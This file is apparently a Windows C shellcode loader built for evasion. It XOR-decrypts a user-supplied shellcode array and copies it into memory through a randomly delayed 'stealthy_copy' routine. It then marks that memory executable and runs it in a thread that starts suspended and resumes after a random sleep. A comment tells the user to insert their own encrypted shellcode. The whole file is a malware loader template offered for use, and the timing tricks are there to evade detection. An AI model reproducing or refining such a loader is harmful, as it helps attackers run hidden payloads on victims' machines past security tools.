#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
void XORDecrypt(unsigned char* data, size_t data_len, unsigned char key) {
    for(size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}
void stealthy_copy(void* dest, const void* src, size_t n) {
    volatile uint8_t* d = (volatile uint8_t*)dest;
    const uint8_t* s = (const uint8_t*)src;
    for(size_t i = 0; i < n; i++) {
        d[i] = s[i];
        Sleep(rand() % 10);
    }
}

int main() {
    srand((unsigned int)time(NULL));
    unsigned char encrypted_shellcode[] = ""; // Your ShellCode ( Crypter For This XOR )
    const unsigned char xor_key = 0xAA; // XOR Key
    XORDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode), xor_key);
    LPVOID exec_mem = VirtualAlloc(
        NULL, 
        sizeof(encrypted_shellcode), 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    
    if (exec_mem == NULL) {
        return -1;
    }
    stealthy_copy(exec_mem, encrypted_shellcode, sizeof(encrypted_shellcode));
    DWORD old_protect;
    if (!VirtualProtect(
        exec_mem, 
        sizeof(encrypted_shellcode), 
        PAGE_EXECUTE_READ, 
        &old_protect
    )) {
        return -1;
    }
    HANDLE thread = CreateThread(
        NULL, 
        rand() % 1024,
        (LPTHREAD_START_ROUTINE)exec_mem, 
        NULL, 
        CREATE_SUSPENDED,
        NULL
    );
    
    if (thread == NULL) {
        return -1;
    }
    Sleep(rand() % 1000);
    ResumeThread(thread);
    while(WaitForSingleObject(thread, 100) == WAIT_TIMEOUT) {
        Sleep(rand() % 100);
    }
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
